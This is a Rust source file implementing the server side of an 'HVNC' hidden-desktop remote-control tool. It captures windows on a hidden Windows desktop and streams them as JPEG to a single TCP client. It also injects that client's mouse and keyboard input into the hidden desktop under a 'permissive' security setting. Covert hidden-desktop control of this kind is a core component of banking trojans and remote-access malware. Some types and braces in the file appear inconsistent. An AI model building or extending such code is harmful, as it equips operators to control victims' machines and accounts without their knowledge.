use crate::common::{ServerConfig, InputEvent, MouseButton};
use crate::HvncError;
use crate::host::WindowHandle;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use tokio::time::{timeout, Duration, interval};
use tokio::sync::mpsc;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use log::{info, warn, error, debug};

type Result<T> = std::result::Result<T, HvncError>;

const MAX_FRAME_SIZE: usize = 10 * 1024 * 1024;
const DEFAULT_JPEG_QUALITY: u8 = 80;
const DEFAULT_FRAME_RATE_MS: u32 = 33;

/// HVNC Server
pub struct HvncServer {
    config: ServerConfig,
    listener: Option<TcpListener>,
    current_client: Option<TcpStream>,
    shutdown_signal: Arc<AtomicBool>,
}

impl HvncServer {
    /// Create a new server
    pub fn new(config: ServerConfig) -> Self {
        Self {
            config,
            listener: None,
            current_client: None,
            shutdown_signal: Arc::new(AtomicBool::new(false)),
        }
    }
    
    /// Start the server
    pub async fn start(&mut self) -> Result<()> {
        let listener = TcpListener::bind(&self.config.bind_address).await
            .map_err(|e| HvncError::Network(e))?;
        
        info!("Server listening on {}", self.config.bind_address);
        self.listener = Some(listener);
        
        Ok(())
    }
    
    /// Accept and handle client connections (single client only)
    pub async fn accept_connections(&mut self) -> Result<()> {
        let listener = self.listener.as_ref()
            .ok_or_else(|| HvncError::Connection("Server not started".to_string()))?;
        
        loop {
            // Check for shutdown signal
            if self.shutdown_signal.load(Ordering::Relaxed) {
                info!("Server shutdown requested");
                break;
            }
            
            // Accept new connection with timeout
            match timeout(Duration::from_secs(1), listener.accept()).await {
                Ok(Ok((stream, addr))) => {
                    info!("New client connection from: {}", addr);
                    
                    // Check if we already have a client
                    if self.current_client.is_some() {
                        warn!("Rejecting connection from {} - client already connected", addr);
                        drop(stream); // Close the connection
                        continue;
                    }
                    
                    // Store the client connection
                    self.current_client = Some(stream);
                    info!("Client {} connected successfully", addr);
                }
                Ok(Err(e)) => {
                    error!("Failed to accept connection: {}", e);
                    return Err(HvncError::Network(e));
                }
                Err(_) => {
                    // Timeout - continue loop to check shutdown signal
                    continue;
                }
            }
        }
        
        Ok(())
    }

    /// Accept a single client connection
    pub async fn accept_single_connection(&mut self) -> Result<()> {
        let listener = self.listener.as_ref()
            .ok_or_else(|| HvncError::Connection("Server not started".to_string()))?;
        
        // Accept new connection with timeout
        match timeout(Duration::from_secs(1), listener.accept()).await {
            Ok(Ok((stream, addr))) => {
                info!("New client connection from: {}", addr);
                
                // Check if we already have a client
                if self.current_client.is_some() {
                    warn!("Rejecting connection from {} - client already connected", addr);
                    drop(stream); // Close the connection
                    return Err(HvncError::Connection("Client already connected".to_string()));
                }
                
                // Store the client connection
                self.current_client = Some(stream);
                info!("Client {} connected successfully", addr);
                Ok(())
            }
            Ok(Err(e)) => {
                debug!("Failed to accept connection: {}", e);
                Err(HvncError::Network(e))
            }
            Err(_) => {
                // Timeout
                Err(HvncError::ConnectionTimeout("Accept timed out".to_string()))
            }
        }
    }
    
    /// Handle a client connection with frame streaming and input handling
    pub async fn handle_client(
        &mut self,
        window: WindowHandle,
        desktop: Option<crate::host::DesktopHandle>,
    ) -> Result<()> {
        // Check if we have a client connected
        if self.current_client.is_none() {
            return Err(HvncError::Connection("No client connected".to_string()));
        }

        info!("🚀 Starting client session with frame streaming for window: {:?}", window);
        
        // Take ownership of the stream temporarily for processing
        let stream = self.current_client.take()
            .ok_or_else(|| HvncError::Connection("No client connected".to_string()))?;
            
        // Split stream for concurrent read/write
        let (mut read_half, mut write_half) = stream.into_split();
        
        // Create channels for communication between tasks
        let (input_tx, mut input_rx) = mpsc::channel::<InputEvent>(100);
        let shutdown_signal = Arc::clone(&self.shutdown_signal);
        
        // Spawn input handling task - completely optional and non-blocking
        let input_task = {
            let shutdown_signal = Arc::clone(&shutdown_signal);
            tokio::spawn(async move {
                info!("📥 Input handler ready - waiting for client input (optional)");
                
                loop {
                    if shutdown_signal.load(Ordering::Relaxed) {
                        info!("Input handler shutdown requested");
                        break;
                    }
                    
                    // Try to receive input with timeout
                    match timeout(Duration::from_millis(100), Self::receive_input_from_read_half(&mut read_half)).await {
                        Ok(Ok(input_event)) => {
                            debug!("📥 Received input event: {:?}", input_event);
                            if input_tx.send(input_event).await.is_err() {
                                warn!("Failed to send input event to handler");
                                break;
                            }
                        }
                        Ok(Err(e)) => {
                            debug!("Input receive error (client may have disconnected): {}", e);
                            break;
                        }
                        Err(_) => {
                            // Timeout - continue loop
                            continue;
                        }
                    }
                }
                
                info!("📥 Input handler task completed");
            })
        };

        // Frame streaming configuration
        let frame_rate_ms = self.config.frame_rate_ms;
        let mut frame_interval = interval(Duration::from_millis(frame_rate_ms));
        
        // Window validation for input handler
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        let is_window_visible = unsafe { winapi::um::winuser::IsWindowVisible(window) != 0 };
        info!("🪟 Window validation for input handler - valid: {}, visible: {}", is_window_valid, is_window_visible);
        
        info!("✅ HVNC Input handler configured with desktop context switching for hidden desktop compatibility");
        
        // Initialize and configure InputHandler once per session
        let mut input_handler = crate::host::inputtemp::InputHandler::new();
        input_handler.set_rate_limit_ms(0);
        input_handler.set_security_config(crate::host::inputtemp::SecurityConfig::permissive());
        if let Some(d) = desktop {
            input_handler.set_target_desktop(d);
            // Configure strategy for hidden desktop window targets
            input_handler.set_input_strategy(crate::host::inputtemp::InputStrategy::for_hidden_desktop());
            info!("✅ HVNC Input handler target desktop set, permissive security applied, strategy=hidden_desktop");
            // Desktop context diagnostics: ensure our thread and target window live on same desktop
            let current_tid = unsafe { winapi::um::processthreadsapi::GetCurrentThreadId() };
            let current_hdesk = unsafe { winapi::um::winuser::GetThreadDesktop(current_tid) };
            let mut window_tid: u32 = 0;
            unsafe { winapi::um::winuser::GetWindowThreadProcessId(window, &mut window_tid); }
            let window_hdesk = unsafe { winapi::um::winuser::GetThreadDesktop(window_tid) };
            info!("🖥️ Desktop context: current_thread_id={}, current_desktop={:?}, window_thread_id={}, window_desktop={:?}", current_tid, current_hdesk, window_tid, window_hdesk);
        } else {
            // Strategy fallback for main desktop
            input_handler.set_input_strategy(crate::host::inputtemp::InputStrategy { method: crate::host::inputtemp::InputMethod::Auto, use_thread_attachment: true, validate_window: true, force_foreground: true });
            warn!("⚠️ No desktop handle provided to InputHandler; hidden desktop input may not focus correctly");
        }
        
        info!("🔄 Client session loop starting with window handle: {:?}", window);
        info!("⏰ Frame rate configured: {}ms interval", frame_rate_ms);
        
        // Send a small initial heartbeat frame to verify streaming path and unblock client header wait
        // This helps diagnose cases where capture is failing but network is fine
        {
            let test_w: usize = 32;
            let test_h: usize = 24;
            // Simple black RGBA buffer (capture::compress_to_jpeg expects RGBA input)
            let test_rgba = vec![0u8; test_w * test_h * 4];
            let jpeg_quality = self.config.jpeg_quality;
            let (w_u32, h_u32) = (u32::try_from(test_w).unwrap_or(32), u32::try_from(test_h).unwrap_or(24));
            match crate::host::capture::compress_to_jpeg(&test_rgba, w_u32, h_u32, jpeg_quality) {
                Ok(initial_jpeg) => {
                    info!(
                        "🧪 Sending initial heartbeat frame: {} bytes ({}x{}, q={})",
                        initial_jpeg.len(), test_w, test_h, jpeg_quality
                    );
                    if let Err(e) = Self::stream_frame_to_write_half(&mut write_half, &initial_jpeg).await {
                        error!("❌ Failed to send initial heartbeat frame: {}", e);
                        // If we cannot send even the heartbeat frame, abort the session
                        input_task.abort();
                        return Err(e);
                    }
                }
                Err(e) => {
                    warn!("⚠️ Failed to build initial heartbeat JPEG: {}", e);
                }
            }
        }
        
        let mut frame_count = 0;
        // Track whether input channel is still open to avoid starving the frame ticker when sender drops
        let mut input_open = true;
        
        loop {
            if shutdown_signal.load(Ordering::Relaxed) {
                info!("Client session shutdown requested");
                break;
            }
            
            debug!("🔄 Loop iteration {}, checking for frame tick or input", frame_count);
            
            tokio::select! {
                // Handle frame streaming
                _ = frame_interval.tick() => {
                    frame_count += 1;
                    info!("⏰ Frame interval tick #{} - attempting capture with window handle: {:?}", frame_count, window);
                    
                    // Comprehensive frame capture with multiple strategies
                    let capture_result = if window as usize == 1 {
                        warn!("❌ Desktop capture mode requested but skipping - no valid window handle");
                        Err(HvncError::window_not_found("No valid window handle for capture"))
                    } else {
                        // Check if window is actually visible/valid before capture
                        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
                        let is_window_visible = unsafe { winapi::um::winuser::IsWindowVisible(window) != 0 };
                        
                        info!("🔍 Window validation: valid={}, visible={}", is_window_valid, is_window_visible);
                        
                        if !is_window_valid {
                            error!("❌ Window handle is invalid: {:?}", window);
                            Err(HvncError::window_not_found("Invalid window handle"))
                        } else if !is_window_visible {
                            warn!("⚠️ Window is not visible - may be in hidden desktop or minimized");
                            info!("🔄 Attempting capture anyway (hidden desktop scenario)");
                            
                            // Try advanced capture with hidden window only if we have a desktop handle
                            let advanced_hidden_capture = if let Some(d) = desktop {
                                info!("🖥️ Using advanced hidden desktop capture (desktop handle present)");
                                match crate::host::capture_advanced::capture_window_advanced(window, d) {
                                    Ok(frame) => {
                                        info!("✅ Advanced hidden window capture successful: {}x{}", frame.width, frame.height);
                                        Ok(frame)
                                    }
                                    Err(e) => {
                                        warn!("❌ Advanced hidden window capture failed: {}", e);
                                        Err(e)
                                    }
                                }
                            } else {
                                warn!("⚠️ No desktop handle available, skipping advanced hidden capture");
                                Err(HvncError::window_not_found("No desktop handle for advanced capture"))
                            };
                            
                            match advanced_hidden_capture {
                                Ok(frame) => Ok(frame),
                                Err(e) => {
                                    // Try direct capture from the main desktop
                                    info!("🔄 Trying fallback: capture from main desktop");
                                    match crate::host::capture::capture_window(window) {
                                        Ok(frame) => {
                                            info!("✅ Main desktop fallback successful: {}x{}", frame.width, frame.height);
                                            Ok(frame)
                                        }
                                        Err(e2) => {
                                            error!("❌ All capture methods failed. Hidden: {}, Main: {}", e, e2);
                                            Err(e2)
                                        }
                                    }
                                }
                            }
                        } else {
                            // Window is visible - prefer advanced capture when desktop handle is available
                            info!("🚀 Using advanced HVNC capture for visible window: {:?}", window);
                            let visible_advanced = if let Some(d) = desktop {
                                match crate::host::capture_advanced::capture_window_advanced(window, d) {
                                    Ok(frame) => {
                                        info!("✅ Advanced visible window capture successful: {}x{}", frame.width, frame.height);
                                        Ok(frame)
                                    }
                                    Err(e) => {
                                        warn!("❌ Advanced visible window capture failed: {}", e);
                                        Err(e)
                                    }
                                }
                            } else {
                                warn!("⚠️ No desktop handle provided, skipping advanced visible capture");
                                Err(HvncError::window_not_found("No desktop handle for advanced capture"))
                            };
                            
                            match visible_advanced {
                                Ok(frame) => Ok(frame),
                                Err(e) => {
                                    // Fallback chain
                                    info!("🔄 Falling back to desktop switch capture");
                                    match crate::host::capture::capture_window_with_desktop_switch(window, desktop) {
                                        Ok(frame) => {
                                            info!("✅ Desktop switch fallback successful: {}x{}", frame.width, frame.height);
                                            Ok(frame)
                                        }
                                        Err(e2) => {
                                            warn!("❌ Desktop switch fallback failed: {}", e2);
                                            // Use desktop context-aware capture
                                            info!("🔧 Using desktop context-aware capture for HVNC");
                                            match crate::host::capture::capture_window_with_desktop_context(window, desktop) {
                                                Ok(frame) => {
                                                    info!("✅ Desktop context capture successful: {}x{}", frame.width, frame.height);
                                                    Ok(frame)
                                                }
                                                Err(e3) => {
                                                    warn!("❌ Desktop context capture failed: {}", e3);
                                                    // Final fallback to basic capture
                                                    info!("🔄 Final fallback: basic window capture");
                                                    crate::host::capture::capture_window(window)
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    };
                    
                    match capture_result {
                        Ok(frame) => {
                            debug!("📸 Frame captured successfully: {}x{}", frame.width, frame.height);
                            
                            // Compress frame to JPEG
                            let jpeg_quality = self.config.jpeg_quality;
                            match crate::host::capture::compress_to_jpeg(&frame.data, frame.width, frame.height, jpeg_quality) {
                                Ok(compressed_data) => {
                                    debug!("🗜️ Frame compressed to {} bytes (quality: {})", compressed_data.len(), jpeg_quality);
                                    
                                    // Validate JPEG data
                                    if compressed_data.len() < 10 {
                                        warn!("⚠️ Compressed frame is suspiciously small: {} bytes", compressed_data.len());
                                    }
                                    
                                    // Check if frame is all black (common issue)
                                    let is_likely_black = compressed_data.len() < 1000; // Very small JPEG usually means black frame
                                    if is_likely_black {
                                        warn!("⚠️ Frame appears to be all black (size: {} bytes)", compressed_data.len());
                                    }
                                    
                                    // Stream frame to client
                                    match Self::stream_frame_to_write_half(&mut write_half, &compressed_data).await {
                                        Ok(()) => {
                                            debug!("📤 Frame streamed successfully to client");
                                        }
                                        Err(e) => {
                                            error!("❌ Failed to stream frame to client: {}", e);
                                            break; // Exit loop on streaming error
                                        }
                                    }
                                }
                                Err(e) => {
                                    error!("❌ Failed to compress frame: {}", e);
                                }
                            }
                        }
                        Err(e) => {
                            debug!("❌ Frame capture failed: {}", e);
                            // Continue loop - don't break on capture errors
                        }
                    }
                }
                
                // Handle input events (optional)
                input_event = input_rx.recv(), if input_open => {
                    if let Some(event) = input_event {
                        info!("🎮 HVNC Input: Processing input event: {:?}", event);
                        
                        // Process the input event and inject it into the hidden desktop using the configured handler
                        match input_handler.process_input_event(window, event.clone()) {
                            Ok(()) => {
                                info!("✅ HVNC Input: Successfully processed input event: {:?}", event);
                            }
                            Err(e) => {
                                warn!("❌ HVNC Input: Failed to process input event {:?}: {}", event, e);
                                // Continue processing other events even if one fails
                            }
                        }
                    } else {
                        // Channel closed (input task ended or client write half closed). Disable this branch to prevent starvation.
                        info!("📥 HVNC Input: input channel closed; disabling input handling to prioritize frame streaming");
                        input_open = false;
                    }
                }
            }
        }
        
        // Clean up
        input_task.abort();
        info!("🔚 Client session ended");
        
        Ok(())
    }

    /// Stream a frame to the client
    pub async fn stream_frame(
        stream: &mut TcpStream,
        frame_data: &[u8],
    ) -> Result<()> {
        // Validate frame size
        if frame_data.len() > MAX_FRAME_SIZE {
            return Err(HvncError::InvalidState(format!(
                "Frame too large: {} bytes (max: {})", 
                frame_data.len(), 
                MAX_FRAME_SIZE
            )));
        }
        
        // Protocol: [2 bytes magic FF D8][4 bytes big-endian length][JPEG bytes]
        // Send magic bytes to allow client-side validation
        stream.write_all(&[0xFF, 0xD8]).await
            .map_err(|e| HvncError::Network(e))?;
        
        // Send frame length (4 bytes, big-endian)
        let frame_length = frame_data.len() as u32;
        let length_bytes = frame_length.to_be_bytes();
        stream.write_all(&length_bytes).await
            .map_err(|e| HvncError::Network(e))?;
        
        // Send frame data
        stream.write_all(frame_data).await
            .map_err(|e| HvncError::Network(e))?;
        
        // Flush to ensure data is sent immediately
        stream.flush().await
            .map_err(|e| HvncError::Network(e))?;
        
        Ok(())
    }

    /// Stream a frame to the client using WriteHalf
    pub async fn stream_frame_to_write_half(
        stream: &mut tokio::net::tcp::OwnedWriteHalf,
        frame_data: &[u8],
    ) -> Result<()> {
        // Validate frame size
        if frame_data.len() > MAX_FRAME_SIZE {
            return Err(HvncError::InvalidState(format!(
                "Frame too large: {} bytes (max: {})", 
                frame_data.len(), 
                MAX_FRAME_SIZE
            )));
        }
        
        // Protocol: [2 bytes magic FF D8][4 bytes big-endian length][JPEG bytes]
        // Send magic bytes to allow client-side validation
        stream.write_all(&[0xFF, 0xD8]).await
            .map_err(|e| HvncError::Network(e))?;
        
        // Send frame length (4 bytes, big-endian)
        let frame_length = frame_data.len() as u32;
        let length_bytes = frame_length.to_be_bytes();
        stream.write_all(&length_bytes).await
            .map_err(|e| HvncError::Network(e))?;
        
        // Send frame data
        stream.write_all(frame_data).await
            .map_err(|e| HvncError::Network(e))?;
        
        // Flush to ensure data is sent immediately
        stream.flush().await
            .map_err(|e| HvncError::Network(e))?;
        
        Ok(())
    }

    /// Receive input from client using ReadHalf
    pub async fn receive_input_from_read_half(
        stream: &mut tokio::net::tcp::OwnedReadHalf,
    ) -> Result<InputEvent> {
        // Read message length (4 bytes, little-endian to match client)
        let mut length_bytes = [0u8; 4];
        stream.read_exact(&mut length_bytes).await
            .map_err(|e| HvncError::Network(e))?;
        
        let message_length = u32::from_le_bytes(length_bytes) as usize;
        
        // Validate message length
        if message_length == 0 || message_length > 1024 {
            return Err(HvncError::InvalidInput(format!(
                "Invalid message length: {}", message_length
            )));
        }
        
        // Read message data
        let mut message_data = vec![0u8; message_length];
        stream.read_exact(&mut message_data).await
            .map_err(|e| HvncError::Network(e))?;
        
        // Parse JSON
        let input_event: InputEvent = serde_json::from_slice(&message_data)
            .map_err(|e| HvncError::InvalidInput(format!("JSON parse error: {}", e)))?;
        
        // Validate input event
        Self::validate_input_event(&input_event)?;
        
        Ok(input_event)
    }

    /// Validate input event
    pub fn validate_input_event(event: &InputEvent) -> Result<()> {
        match event {
            InputEvent::MouseMove { x, y } => {
                if *x > 10000 || *y > 10000 {
                    return Err(HvncError::InvalidInput("Mouse coordinates out of range".to_string()));
                }
            }
            InputEvent::MouseClick { x, y, .. } => {
                if *x > 10000 || *y > 10000 {
                    return Err(HvncError::InvalidInput("Mouse coordinates out of range".to_string()));
                }
            }
            InputEvent::KeyboardEvent { keycode, .. } => {
                if *keycode > 255 {
                    return Err(HvncError::InvalidInput("Invalid keycode".to_string()));
                }
            }
        }
        Ok(())
    }

    /// Check if server has a client connected
    pub fn has_client(&self) -> bool {
        self.current_client.is_some()
    }

    /// Get bind address
    pub fn bind_address(&self) -> &str {
        &self.config.bind_address
    }

    /// Request shutdown
    pub fn shutdown(&self) {
        self.shutdown_signal.store(true, Ordering::Relaxed);
    }

    /// Check if shutdown was requested
    pub fn is_shutdown_requested(&self) -> bool {
        self.shutdown_signal.load(Ordering::Relaxed)
    }

    /// Disconnect current client
    pub fn disconnect_client(&mut self) {
        if let Some(_) = self.current_client.take() {
            info!("Client disconnected");
        }
    }
    /// Placeholder auto setup for optional services (e.g., SSH) - currently no-op
    pub fn auto_setup(&mut self) -> Result<()> {
        info!("Auto setup: optional services initialized (no-op)");
        Ok(())
    }
    }

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{ServerConfig, InputEvent, MouseButton};
    use tokio::net::TcpStream;
    use tokio::io::{AsyncWriteExt, AsyncReadExt};
    use std::time::Duration;

    fn create_test_config() -> ServerConfig {
        ServerConfig {
            bind_address: "127.0.0.1:0".to_string(),
            target_application: "notepad.exe".to_string(),
            jpeg_quality: Some(80),
            frame_rate_ms: Some(33),
        }
    }

    #[tokio::test]
    async fn test_server_creation() {
        let config = create_test_config();
        let server = HvncServer::new(config);
        
        assert_eq!(server.bind_address(), "127.0.0.1:0");
        assert!(!server.has_client());
        assert!(!server.is_shutdown_requested());
    }
}
